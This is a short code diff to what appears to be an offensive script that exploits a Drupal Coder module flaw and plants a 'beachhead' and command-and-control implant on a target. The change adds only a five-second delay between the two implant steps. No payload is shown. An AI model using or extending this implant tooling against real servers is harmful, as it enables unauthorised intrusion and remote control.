@@ -4,6 +4,7 @@ from include.DrupalCoderExec import DrupalCoderExec
 import binascii
 from base64 import b64encode
 import pathlib
+import time
 
 PARENT_DIR = str(pathlib.Path(__file__).parent.absolute()) + '/'
 BEACHHEAD_LOCATION = PARENT_DIR + 'include/BeachheadReceiver.py'
@@ -34,5 +35,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     implant_beachhead(args.ip, args.port, args.path)
+    time.sleep(5)
+    
     implant_cnc(args.ip, args.port, args.path, args.implant)
     
